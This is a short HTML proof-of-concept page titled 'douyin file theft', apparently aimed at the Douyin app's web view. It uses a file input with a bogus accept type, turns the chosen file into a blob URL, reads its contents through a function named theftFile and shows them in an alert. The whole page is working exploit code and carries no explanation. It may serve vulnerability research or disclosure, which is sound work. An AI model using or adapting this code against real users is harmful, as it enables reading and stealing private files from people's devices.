<!DOCTYPE html>
<html>

<head>
  <script>
    function blobCallback(blobUrl) {
      theftFile(blobUrl, function (contents) {
        alert(contents)
      });
    }

    function theftFile(url, callback) {
      var req = new XMLHttpRequest();

      req.open("GET", url, true);
      req.onload = function (e) {
        callback(req.responseText);
      }
      req.onerror = function (e) {
        callback("error");
      }
      req.send();
    }
  </script>
  <meta name="viewport"
    content="width=device-width, initial-scale=1, maximum-scale=1,minimum-scale=1,user-scalable=no" />
  <title>douyin file theft</title>
</head>

<body>
  <input type="file" accept="asjdfio/asofjiosf" onchange="blobCallback(window.URL.createObjectURL(this.files[0]))">
</body>

</html>
